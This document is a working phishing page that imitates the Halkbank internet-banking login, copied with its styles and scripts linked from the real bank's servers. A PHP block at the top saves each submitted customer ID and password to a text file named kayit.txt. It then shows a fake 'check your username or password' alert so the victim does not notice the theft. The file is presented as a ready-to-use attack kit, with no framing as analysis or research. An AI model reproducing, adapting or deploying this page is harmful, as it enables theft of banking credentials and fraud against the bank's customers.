<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {

$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n __________________ \nUsername: ".$username."\nPassword: ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}
 ?>


<html ng-app="app"><head><style type="text/css">[uib-typeahead-popup].dropdown-menu{display:block;}</style><style type="text/css">.uib-time input{width:50px;}</style><style type="text/css">[uib-tooltip-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-bottom > .tooltip-arrow,[uib-popover-popup].popover.top-left > .arrow,[uib-popover-popup].popover.top-right > .arrow,[uib-popover-popup].popover.bottom-left > .arrow,[uib-popover-popup].popover.bottom-right > .arrow,[uib-popover-popup].popover.left-top > .arrow,[uib-popover-popup].popover.left-bottom > .arrow,[uib-popover-popup].popover.right-top > .arrow,[uib-popover-popup].popover.right-bottom > .arrow,[uib-popover-html-popup].popover.top-left > .arrow,[uib-popover-html-popup].popover.top-right > .arrow,[uib-popover-html-popup].popover.bottom-left > .arrow,[uib-popover-html-popup].popover.bottom-right > .arrow,[uib-popover-html-popup].popover.left-top > .arrow,[uib-popover-html-popup].popover.left-bottom > .arrow,[uib-popover-html-popup].popover.right-top > .arrow,[uib-popover-html-popup].popover.right-bottom > .arrow,[uib-popover-template-popup].popover.top-left > .arrow,[uib-popover-template-popup].popover.top-right > .arrow,[uib-popover-template-popup].popover.bottom-left > .arrow,[uib-popover-template-popup].popover.bottom-right > .arrow,[uib-popover-template-popup].popover.left-top > .arrow,[uib-popover-template-popup].popover.left-bottom > .arrow,[uib-popover-template-popup].popover.right-top > .arrow,[uib-popover-template-popup].popover.right-bottom > .arrow{top:auto;bottom:auto;left:auto;right:auto;margin:0;}[uib-popover-popup].popover,[uib-popover-html-popup].popover,[uib-popover-template-popup].popover{display:block !important;}</style><style type="text/css">.uib-datepicker-popup.dropdown-menu{display:block;float:none;margin:0;}.uib-button-bar{padding:10px 9px 2px;}</style><style type="text/css">.uib-position-measure{display:block !important;visibility:hidden !important;position:absolute !important;top:-9999px !important;left:-9999px !important;}.uib-position-scrollbar-measure{position:absolute !important;top:-9999px !important;width:50px !important;height:50px !important;overflow:scroll !important;}.uib-position-body-scrollbar-measure{overflow:scroll !important;}</style><style type="text/css">.uib-datepicker .uib-title{width:100%;}.uib-day button,.uib-month button,.uib-year button{min-width:100%;}.uib-left,.uib-right{width:100%}</style><style type="text/css">.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><style type="text/css">[uib-typeahead-popup].dropdown-menu{display:block;}</style><style type="text/css">.uib-time input{width:50px;}</style><style type="text/css">[uib-tooltip-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-bottom > .tooltip-arrow,[uib-popover-popup].popover.top-left > .arrow,[uib-popover-popup].popover.top-right > .arrow,[uib-popover-popup].popover.bottom-left > .arrow,[uib-popover-popup].popover.bottom-right > .arrow,[uib-popover-popup].popover.left-top > .arrow,[uib-popover-popup].popover.left-bottom > .arrow,[uib-popover-popup].popover.right-top > .arrow,[uib-popover-popup].popover.right-bottom > .arrow,[uib-popover-html-popup].popover.top-left > .arrow,[uib-popover-html-popup].popover.top-right > .arrow,[uib-popover-html-popup].popover.bottom-left > .arrow,[uib-popover-html-popup].popover.bottom-right > .arrow,[uib-popover-html-popup].popover.left-top > .arrow,[uib-popover-html-popup].popover.left-bottom > .arrow,[uib-popover-html-popup].popover.right-top > .arrow,[uib-popover-html-popup].popover.right-bottom > .arrow,[uib-popover-template-popup].popover.top-left > .arrow,[uib-popover-template-popup].popover.top-right > .arrow,[uib-popover-template-popup].popover.bottom-left > .arrow,[uib-popover-template-popup].popover.bottom-right > .arrow,[uib-popover-template-popup].popover.left-top > .arrow,[uib-popover-template-popup].popover.left-bottom > .arrow,[uib-popover-template-popup].popover.right-top > .arrow,[uib-popover-template-popup].popover.right-bottom > .arrow{top:auto;bottom:auto;left:auto;right:auto;margin:0;}[uib-popover-popup].popover,[uib-popover-html-popup].popover,[uib-popover-template-popup].popover{display:block !important;}</style><style type="text/css">.uib-datepicker-popup.dropdown-menu{display:block;float:none;margin:0;}.uib-button-bar{padding:10px 9px 2px;}</style><style type="text/css">.uib-position-measure{display:block !important;visibility:hidden !important;position:absolute !important;top:-9999px !important;left:-9999px !important;}.uib-position-scrollbar-measure{position:absolute !important;top:-9999px !important;width:50px !important;height:50px !important;overflow:scroll !important;}.uib-position-body-scrollbar-measure{overflow:scroll !important;}</style><style type="text/css">.uib-datepicker .uib-title{width:100%;}.uib-day button,.uib-month button,.uib-year button{min-width:100%;}.uib-left,.uib-right{width:100%}</style><style type="text/css">.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><style type="text/css">[uib-typeahead-popup].dropdown-menu{display:block;}</style><style type="text/css">.uib-time input{width:50px;}</style><style type="text/css">[uib-tooltip-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-bottom > .tooltip-arrow,[uib-popover-popup].popover.top-left > .arrow,[uib-popover-popup].popover.top-right > .arrow,[uib-popover-popup].popover.bottom-left > .arrow,[uib-popover-popup].popover.bottom-right > .arrow,[uib-popover-popup].popover.left-top > .arrow,[uib-popover-popup].popover.left-bottom > .arrow,[uib-popover-popup].popover.right-top > .arrow,[uib-popover-popup].popover.right-bottom > .arrow,[uib-popover-html-popup].popover.top-left > .arrow,[uib-popover-html-popup].popover.top-right > .arrow,[uib-popover-html-popup].popover.bottom-left > .arrow,[uib-popover-html-popup].popover.bottom-right > .arrow,[uib-popover-html-popup].popover.left-top > .arrow,[uib-popover-html-popup].popover.left-bottom > .arrow,[uib-popover-html-popup].popover.right-top > .arrow,[uib-popover-html-popup].popover.right-bottom > .arrow,[uib-popover-template-popup].popover.top-left > .arrow,[uib-popover-template-popup].popover.top-right > .arrow,[uib-popover-template-popup].popover.bottom-left > .arrow,[uib-popover-template-popup].popover.bottom-right > .arrow,[uib-popover-template-popup].popover.left-top > .arrow,[uib-popover-template-popup].popover.left-bottom > .arrow,[uib-popover-template-popup].popover.right-top > .arrow,[uib-popover-template-popup].popover.right-bottom > .arrow{top:auto;bottom:auto;left:auto;right:auto;margin:0;}[uib-popover-popup].popover,[uib-popover-html-popup].popover,[uib-popover-template-popup].popover{display:block !important;}</style><style type="text/css">.uib-datepicker-popup.dropdown-menu{display:block;float:none;margin:0;}.uib-button-bar{padding:10px 9px 2px;}</style><style type="text/css">.uib-position-measure{display:block !important;visibility:hidden !important;position:absolute !important;top:-9999px !important;left:-9999px !important;}.uib-position-scrollbar-measure{position:absolute !important;top:-9999px !important;width:50px !important;height:50px !important;overflow:scroll !important;}.uib-position-body-scrollbar-measure{overflow:scroll !important;}</style><style type="text/css">.uib-datepicker .uib-title{width:100%;}.uib-day button,.uib-month button,.uib-year button{min-width:100%;}.uib-left,.uib-right{width:100%}</style><style type="text/css">.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Halkbank İnternet Şubesi</title>
    <base href="/InternetBankingHost/">
    <!-- -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="cache-control" content="max-age=0">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
    <meta http-equiv="pragma" content="no-cache">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">

    <!-- -->
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/bootstrap.min.css?v=1557307961656">
    
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/production.min.css?v=1557307961656">
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/production-plugins.min.css?v=1557307961656">
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/skins.min.css?v=1557307961656">
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/veribranch-all.css?v=1557307961656">
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/receipt.css?v=1557307961656">
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/css/plugins-all.css?v=1557307961656">

    <script type="text/javascript">
        var featureVersions = [];
        featureVersions.push({ "featureName": "VeriBranch.UIDesigner", "version": 1461666575784 });
        featureVersions.push({"featureName":"VeriBranch.PinCreate","version":1557307961606});
        featureVersions.push({ "featureName": "VeriBranch.BackOffice", "version": 1461666574716 });
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.CallCenter","version":1557307960908});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Tools","version":1557307961552});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.CustomerInformation","version":1557307961220});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Credits","version":1557307961170});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Corporate","version":1557307961113});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Cheques","version":1557307961014});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Cards","version":1557307960961});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Payments","version":1557307961444});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Investments","version":1557307961334});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Accounts","version":1557307960831});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.FundTransfers","version":1557307961277});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Security","version":1557307961500});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Login","version":1557307961388});
        featureVersions.push({"featureName":"VeriBranch.Web","version":1557307961656});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Common","version":1557307961061});
    </script>



    <script charset="UTF-8">
        function fraudNetInitiateEvent() {
            if ('' === 'true') {
                hkbadx.hkbinitiate(null);
            }
        }
        function fraudNetValidateEvent() {
            if ('' === 'true') {
                hkbadx.hkbvalidate('hkb-user_prefs');
            }
        }
    </script>


    <!-- -->
    
    <link rel="stylesheet" type="text/css" href="https://sube.halkbank.com.tr/InternetBankingHost/Maintenance/BotDetectCaptcha.ashx?get=layoutStyleSheet">


<style></style><style></style><style></style><style></style><style></style><style></style></head>


<body ng-controller="app.views.mvclogin.HostLoginController as vm" class="halk-bank container extr-page desktop-detected ng-scope mobile-detected">

    
    <header id="header">
        <div>
            <div class="container">
                <div class="row">
                    <div class="col-md-6">
                        <div id="logo-group">
                            <span id="logo"><a href="https://sube.halkbank.com.tr/InternetBankingHost/"><img src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HALKBANK/HALKBANK_logo.svg?v=1" alt="Halk Bankası"></a></span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>


    




    

    <footer id="footer">
        <div class="container">
            <div class="row">
                <div class="col-md-6  md-txt-lf sm-txt-cnt">
                    <span class="copyright">© Copyright 1998, 2019 Türkiye Halk Bankası A.Ş. Tüm hakları saklıdır.</span>
                </div>
                <div class="col-md-6 md-txt-rg sm-txt-cnt">
                    <div class="footer-menu">
                        <a href="#">S.S.S</a>
                        <a href="#">Bize Ulaşın</a>
                        <a href="#">444 0 400</a>
                    </div>
                </div>
            </div>
        </div>
    </footer>


    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/jquery-all.js?v=1557307961656"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/angular-all.js?v=1557307961656"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/plugins-all.js?v=1557307961656"></script><div class="OverlayBG"></div><div class="OverlayBG"></div><div class="OverlayBG"></div>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/highcharts-all.js?v=1557307961656"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/dataTables-all.js?v=1557307961656"></script>


        <script type="text/javascript">
            _.set(window, 'VeriBranch.Config.UniqueKey', '');
        </script>
        <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/vb-all.js?v=1557307961656"></script>
            <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/VeriBranch.Web/Modules/veribranch.directives.js?v=1557307961656"></script>

    
    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="user_prefs2" name="user_prefs2" autocomplete="off">
    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="hkb-user_prefs" name="hkbuser_prefs" autocomplete="off">
    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="clnthdr" name="clnthdr" value="{&quot;Connection&quot;:[&quot;keep-alive&quot;],&quot;Accept&quot;:[&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;],&quot;Accept-Encoding&quot;:[&quot;identity&quot;],&quot;Accept-Language&quot;:[&quot;tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7&quot;],&quot;Cookie&quot;:[&quot;VB_IBHSession=5ccba3d861d4c2897650dc64a5cce04d8cc8ae8a0240121d0934368a9dedfeaad5b4d7ba&quot;],&quot;Host&quot;:[&quot;sube.halkbank.com.tr&quot;],&quot;Referer&quot;:[&quot;https://www.google.com/&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36&quot;],&quot;Upgrade-Insecure-Requests&quot;:[&quot;1&quot;],&quot;Purpose&quot;:[&quot;prefetch&quot;],&quot;X-ip&quot;:[&quot;37.130.96.162&quot;],&quot;X-Port&quot;:[&quot;57575&quot;]}" autocomplete="off">
    <script type="text/javascript" src="/InternetBankingHost/Features/wwwroot/statics/sa/js/sa-all.js?v=1557307961656"></script>

    <a href="javascript:void(0)" class="back-to-top visible-xs">Başa Dön</a>



<div id="main" class="home" role="main" ng-init="vm.customerType=1">
    <section class="contentArea">
        <section class="loginArea">
            <div class="container">
                <vb-spinner vb-is-post-spinner="true" class="ng-isolate-scope"></vb-spinner>
                <div class="spinner-loading-overlay"></div>
                <div class="row">
                    <div class="col-xs-12 col-md-7 col-lg-6 col-lg-offset-1 login-input-box">
                        <div class="login-box">
                            <div id="logo-group" class="visible-xs">
                                <span id="logo"><a target="_blank" href="http://www.halkbank.com.tr"><img src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HALKBANK/HALKBANK_logo2.svg?v=1" alt="Halk Bankası"></a></span>
                            </div>


                                    <div class="ct-switch">
                                        <a href="https://sube.halkbank.com.trjavascript:void(0)" id="CustomerSwitchButton" ng-click="vm.toggleCustomerType()" class="corporate">
                                                <span data-toggle-text="Bireysel">Kurumsal</span>
                                            <i class="fa fa-arrow-right"></i>
                                        </a>
                                    </div>
                            <div ng-show="vm.customerType==1" class="loginContainer retail-login-container">
                                <div>
                                    <div class="tab-content loginInner">
                                        <div class="loginHead">
                                                    <img src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HB_lock.png" height="38">
                                                    <img class="visible-xs" src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HB_lock-white.png" height="38">
                                                    <span data-toggle-text="İnternet Şube Giriş">İnternet Şube Giriş</span>
                                        </div>
                                        <div id="is1">
<form action="" autocomplete="off" class="smart-form first-login prevent-multiple-submit ng-pristine ng-valid" method="post">
                                                <input type="password" style="display:none;" name="FakeCustomerName">
                                                <fieldset>
                                                    <div class="row">
                                                        <section class="col col-xs-12">
                                                            <label class="input">
                                                                <i class="icon-prepend hb-icon-user"></i>
                                                                <input id="PinLoginCustomerID" min="0" type="number" name="login" autocomplete="new-password" autofocus="" tabindex="1" class="input-lg keyboard-input ui-keyboard-input ui-widget-content ui-corner-all" placeholder="Müşteri/TC Kimlik Numarası" value="" aria-haspopup="true" role="textbox" maxlength="20" required="">
                                                                
                                                            </label>
                                                        </section>
                                                        <section class="col col-xs-6">
                                                            <label class="input">
                                                                <i class="icon-prepend fa fa-key"></i>
                                                                <input name="password" type="password" autocomplete="new-password" tabindex="2" class="input-lg password-keyboard ui-keyboard-input ui-widget-content ui-corner-all" placeholder="Parola" value="" aria-haspopup="true" role="textbox" maxlength="20" required="">
                                                                
                                                            </label>
                                                        </section>

                                                            <section class="col col-xs-6">
                                                                <div class="select selectField">
                                                                    <select name="CoexistenceLoginType" class="login-quick-access-dropdown select2-hidden-accessible" tabindex="-1" aria-hidden="true">
                                                                        <option value="InternetBanking">İnternet Şube</option>
                                                                                <option value="1">Halk Yatırım</option>
                                                                    </select>
                                                            </section>
                                                        <input name="LoginType" type="hidden" value="PinLogin" autocomplete="off">
                                                        <input name="CustomerType" type="hidden" value="Retail" autocomplete="off">
                                                    </div>
                                                </fieldset>
                                                <div class="row login-links">
                                                    <div class="col col-lg-7 col-xs-6">
                                                        <div class="virtualKeyboard hidden-xs">
                                                            <a href="javascript:void(0)" ng-click="vm.showVirtualKeyboard($event)">
                                                                <span>Sanal Klavye</span>
                                                            </a>
                                                        </div>

                                                            <a href="https://sube.halkbank.com.tr/InternetBankingHost/PinCreate/CardVerification?lang=tr-TR" class="lang" style="display: inline;">
                                                                <i></i>
                                                                <span>Parolamı Bilmiyorum/Blokeli</span>

                                                            </a>
                                                                                                                                                                    </div>
                                                    <div class="col col-md-6 col-md-offset-1 col-xs-12 col-lg-5 text-right">
                                                        <input type="submit" id="submitbtn" class="loginBtn green mrt15" value="Giriş" tabindex="4">
                                                    </div>
                                                </div>
</form>                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div ng-show="vm.customerType==2" class="loginContainer corporate-login-container ng-hide">
                                <div class="loginInner">

                                    <div class="loginHead">
                                                <img src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HB_lock.png" height="38">
                                                <img class="visible-xs" src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HB_lock-white.png" height="38">
                                                <span data-toggle-text="İnternet Şube Giriş">İnternet Şube Giriş</span>
                                    </div>
<form action="/InternetBankingHost/HostLogin" autocomplete="off" class="smart-form first-login-corporate prevent-multiple-submit ng-pristine ng-valid" method="post">                                        <input type="password" style="display:none;" name="FakeCustomerName">
                                        <fieldset>
                                            <div class="row">
                                                <section class="col col-6 col-xs-12">
                                                    <label class="input">
                                                        <i class="icon-prepend fa fa-building-o"></i>
                                                        <input name="CustomerNumber" min="0" id="PinLoginCustomerCorporateID" type="number" autocomplete="new-password" class="input-lg keyboard-input ui-keyboard-input ui-widget-content ui-corner-all" tabindex="1" placeholder="Firma Müşteri Numarası" value="" aria-haspopup="true" role="textbox">
                                                        
                                                    </label>
                                                </section>
                                                <section class="col col-6 col-xs-12">
                                                    <label class="input">
                                                        <i class="icon-prepend hb-icon-user"></i>
                                                        <input name="CorporateCustomerNumber" type="text" autocomplete="new-password" class="input-lg keyboard-input ui-keyboard-input ui-widget-content ui-corner-all" tabindex="3" placeholder="Kullanıcı Müşteri Numarası" value="" aria-haspopup="true" role="textbox">
                                                        
                                                    </label>
                                                </section>
                                            </div>
                                            <div class="row">
                                                <section class="col col-6 col-xs-12">
                                                    <label class="input">
                                                        <i class="icon-prepend fa fa-key"></i>
                                                        <input name="FirstLoginPassword" type="password" autocomplete="new-password" class="input-lg password-keyboard ui-keyboard-input ui-widget-content ui-corner-all" tabindex="2" placeholder="Parola" value="" aria-haspopup="true" role="textbox">
                                                        
                                                    </label>
                                                </section>




                                                <input name="LoginType" type="hidden" value="PinLogin" autocomplete="off">
                                                <input name="CustomerType" type="hidden" value="Corporate" autocomplete="off">
                                            </div>
                                        </fieldset>
                                        <div class="row">
                                            <div class="col col-lg-7 col-xs-6">
                                                <div class="virtualKeyboard hidden-xs">
                                                    <a href="https://sube.halkbank.com.tr/javascript:void(0)" ng-click="vm.showVirtualKeyboard($event)">
                                                        <span>Sanal Klavye</span>
                                                    </a>
                                                </div>
                                                    <a href="https://sube.halkbank.com.tr/InternetBankingHost/PinCreate/CardVerification?lang=tr-TR" class="lang" style="display: inline;">
                                                        <i></i>
                                                        <span>Parolamı Bilmiyorum/Blokeli</span>

                                                    </a>
                                            
                                            </div>
                                            <div class="col col-md-6 col-md-offset-1 col-xs-12 col-lg-5 text-right">
                                                <input type="submit" class="loginBtn green" value="Giriş">
                                            </div>
                                        </div>
</form>                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="col-xs-12 col-md-4 col-lg-5 login-carousel">
                        
    <div class="forgot-password">
        <div class="remind">
            <div id="myCarousel" class="carousel fade loginSlide" data-ride="carousel">
                <ol class="carousel-indicators">
                            <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
                            <li data-target="#myCarousel" data-slide-to="1" class=""></li>
                            <li data-target="#myCarousel" data-slide-to="2" class=""></li>
                            <li data-target="#myCarousel" data-slide-to="3" class=""></li>
                </ol>
                <div class="carousel-inner">
                            <div class="item active">
                                <div class="carousel-caption ">
                                    <div class="textArea xs-txt-cnt  sm-txt-cnt md-txt-lf">
                                        <a href="https://www.halkbank.com.tr/5817-guvenlik" target="_blank">
                                            <div class="txt txt2">Güvenliğiniz için</div>
<div class="txt txt1">Halkbank İnternet Şubesi girişlerinde; cep telefonu numarası, marka ve modeli bilgileriniz istenmez.</div>
<div class="txt txt3">Detaylı bilgi için tıklayınız</div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="item">
                                <div class="carousel-caption ">
                                    <div class="textArea xs-txt-cnt  sm-txt-cnt md-txt-lf">
                                        <a href="http://www.halkbankkobi.com.tr/" target="_blank">
                                            <div class="txt txt1">A’dan Z’ye KOBİ’ye dair herşey </div>
<div class="txt txt2">halkbankkobi.com.tr’de!</div>
<div class="txt txt3">Detaylar için tıklayınız</div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="item">
                                <div class="carousel-caption ">
                                    <div class="textArea xs-txt-cnt  sm-txt-cnt md-txt-lf">
                                        <a href="https://www.halkbank.com.tr/5825-nasil_uye_olabilirim" target="_blank">
                                            <div class="txt txt1">Hızlı ve güvenli bankacılığın yeni numarası:</div>
<div style="font-family: 'Gotham', Arial;font-weight: 700;font-size: 20px;color: #104d7f;margin-bottom: 5px;letter-spacing: -1px">0850 222 0 400 <br> Halkbank Dialog <br> 0850 222 0 401 <br> Halkbank KOBİ Dialog</div>

                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="item">
                                <div class="carousel-caption ">
                                    <div class="textArea xs-txt-cnt  sm-txt-cnt md-txt-lf">
